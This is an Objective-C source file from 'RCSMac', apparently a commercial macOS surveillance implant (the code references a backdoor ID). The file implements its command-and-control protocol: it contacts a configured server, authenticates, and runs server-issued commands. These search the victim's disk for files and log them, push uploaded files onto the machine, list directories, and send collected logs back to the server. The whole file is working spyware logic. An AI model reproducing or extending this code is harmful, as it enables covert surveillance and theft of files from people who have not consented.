/*
 * RCSMac - RESTNetworkProtocol
 *  Implementation for REST Protocol.
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "RESTNetworkProtocol.h"
#import "RESTTransport.h"

#import "AuthNetworkOperation.h"
#import "IDNetworkOperation.h"
#import "ConfNetworkOperation.h"
#import "DownloadNetworkOperation.h"
#import "UploadNetworkOperation.h"
#import "FSNetworkOperation.h"
#import "LogNetworkOperation.h"
#import "ByeNetworkOperation.h"

#import "RCSMCommon.h"
#import "RCSMFileSystemManager.h"
#import "RCSMTaskManager.h"

//#define DEBUG_PROTO


@implementation RESTNetworkProtocol

- (id)initWithConfiguration: (NSData *)aConfiguration
{
  if (self = [super init])
    {
      if (aConfiguration == nil)
        {
#ifdef DEBUG_PROTO
          errorLog(ME, @"configuration is nil");
#endif
          
          [self release];
          return nil;
        }
      
      syncStruct *header  = (syncStruct *)[aConfiguration bytes];
      mMinDelay           = header->minSleepTime;
      mMaxDelay           = header->maxSleepTime;
      mBandwidthLimit     = header->bandwidthLimit;
      
      NSString *host        = [NSString stringWithCString: header->configString];
      /*NSString *backdoorID  = [NSString stringWithCString:
                               header->configString
                               + strlen(header->configString)
                               + 1];*/
      
#ifdef DEBUG_PROTO
      debugLog(ME, @"minDelay  : %d", mMinDelay);
      debugLog(ME, @"maxDelay  : %d", mMaxDelay);
      debugLog(ME, @"bandWidth : %d", mBandwidthLimit);
      debugLog(ME, @"host      : %@", host);
#endif
      
      NSString *_url;
      _url = [[NSString alloc] initWithFormat: @"http://%@:%d", host, 80];
      mURL    = [[NSURL alloc] initWithString: _url];
      [_url release];
      
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [mURL release];
  [super dealloc];
}

// Abstract Class Methods
- (BOOL)perform
{
#ifdef DEBUG_PROTO
  infoLog(ME, @"");
#endif
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // Init the transport
  RESTTransport *transport = [[RESTTransport alloc] initWithURL: mURL
                                                         onPort: 80];
  
  AuthNetworkOperation *authOP = [[AuthNetworkOperation alloc]
                                  initWithTransport: transport];
  if ([authOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(ME, @"Error on AUTH");
#endif
      
      [authOP release];
      [transport release];
      [outerPool release];
      
      return NO;
    }
  
  [authOP release];
  
  IDNetworkOperation *idOP     = [[IDNetworkOperation alloc]
                                  initWithTransport: transport];
  if ([idOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(ME, @"Error on ID");
#endif
      
      [idOP release];
      [transport release];
      [outerPool release];
      
      return NO;
    }
  
  NSMutableArray *commandList = [[idOP getCommands] retain];
  [idOP release];
  
#ifdef DEBUG_PROTO
  infoLog(ME, @"commands available: %@", commandList);
#endif
  
  int i = 0;
  
  for (; i < [commandList count]; i++)
    {
      uint32_t command = [[commandList objectAtIndex: i] unsignedIntValue];
      
      switch (command)
        {
        case PROTO_NEW_CONF:
          {
            ConfNetworkOperation *confOP = [[ConfNetworkOperation alloc]
                                            initWithTransport: transport];
            if ([confOP perform] == NO)
              {
#ifdef DEBUG_PROTO
                errorLog(ME, @"Error on CONF");
#endif
              }
            
            [confOP release];
          } break;
        case PROTO_DOWNLOAD:
          {
            DownloadNetworkOperation *downOP = [[DownloadNetworkOperation alloc]
                                                initWithTransport: transport];
            if ([downOP perform] == NO)
              {
#ifdef DEBUG_PROTO
                errorLog(ME, @"Error on DOWNLOAD");
#endif
              }
            else
              {
                NSArray *files = [downOP getDownloads];
                
                if ([files count] > 0)
                  {
                    RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
                    
                    for (NSString *fileMask in files)
                      {
#ifdef DEBUG_PROTO
                        infoLog(ME, @"(PROTO_DOWNLOAD) Logging %@", fileMask);
#endif
                        
                        NSArray *filesFound = [fsManager searchFilesOnHD: fileMask];
                        if (filesFound == nil)
                          {
#ifdef DEBUG_PROTO
                            errorLog(ME, @"fileMask (%@) didn't match any files");
#endif
                            continue;
                          }
                        
                        for (NSString *file in filesFound)
                          {
#ifdef DEBUG_PROTO
                            infoLog(ME, @"createLogForFile (%@)", file);
#endif
                            [fsManager logFileAtPath: file];
                          }
                      }
                    
                    [fsManager release];
                  }
                else
                  {
#ifdef DEBUG_PROTO
                    errorLog(ME, @"(PROTO_DOWNLOAD) no file available");
#endif
                  }
              }
            
            [downOP release];
          } break;
        case PROTO_UPLOAD:
          {
            UploadNetworkOperation *upOP = [[UploadNetworkOperation alloc]
                                            initWithTransport: transport];
            
            if ([upOP perform] == NO)
              {
#ifdef DEBUG_PROTO
                errorLog(ME, @"Error on UPLOAD");
#endif
              }
            
            [upOP release];
          } break;
        case PROTO_FILESYSTEM:
          {
            FSNetworkOperation *fsOP = [[FSNetworkOperation alloc]
                                        initWithTransport: transport];
            if ([fsOP perform] == NO)
              {
#ifdef DEBUG_PROTO
                errorLog(ME, @"Error on FS");
#endif
              }
            else
              {
                NSArray *paths = [fsOP getPaths];
#ifdef DEBUG_PROTO
                infoLog(ME, @"paths: %@", paths);
#endif
                
                if ([paths count] > 0)
                  {
                    RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
                    
                    for (NSDictionary *dictionary in paths)
                      {
                        NSString *path = [dictionary objectForKey: @"path"];
                        uint32_t depth = [[dictionary objectForKey: @"depth"] unsignedIntValue];
                        
#ifdef DEBUG_PROTO
                        infoLog(ME, @"(PROTO_FS) path : %@", path);
                        infoLog(ME, @"(PROTO_FS) depth: %d", depth);
#endif
                        
                        [fsManager logDirContent: path
                                       withDepth: depth];
                      }
                    
                    [fsManager release];
                  }
                else
                  {
#ifdef DEBUG_PROTO
                    errorLog(ME, @"(PROTO_FS) no path availalble");
#endif
                  }
              }
            
            [fsOP release];
          } break;
        default:
          {
#ifdef DEBUG_PROTO
            errorLog(ME, @"Received an unknown command (%d)", command);
#endif
          } break;
        }
    }
  
  LogNetworkOperation *logOP = [[LogNetworkOperation alloc]
                                initWithTransport: transport
                                         minDelay: mMinDelay
                                         maxDelay: mMaxDelay
                                        bandwidth: mBandwidthLimit];
  
  if ([logOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(ME, @"Error on LOG");
#endif
    }
  
  [logOP release];
  
  ByeNetworkOperation *byeOP = [[ByeNetworkOperation alloc]
                                initWithTransport: transport];
  if ([byeOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(ME, @"WTF error on BYE?!");
#endif
    }
  [byeOP release];
  
  //
  // Time to reload the configuration, if needed
  // TODO: Refactor this
  //
  RCSMTaskManager *_taskManager = [RCSMTaskManager sharedInstance];
  
  if (_taskManager.mShouldReloadConfiguration == YES)
    {
#ifdef DEBUG_PROTO
      warnLog(ME, @"Loading new configuration");
#endif
      [_taskManager reloadConfiguration];
    }
  else
    {
#ifdef DEBUG_PROTO
      warnLog(ME, @"No new configuration");
#endif
    }
  
  [commandList release];
  [transport release];
  [outerPool release];
  
  return YES;
}
// End Of Abstract Class Methods

@end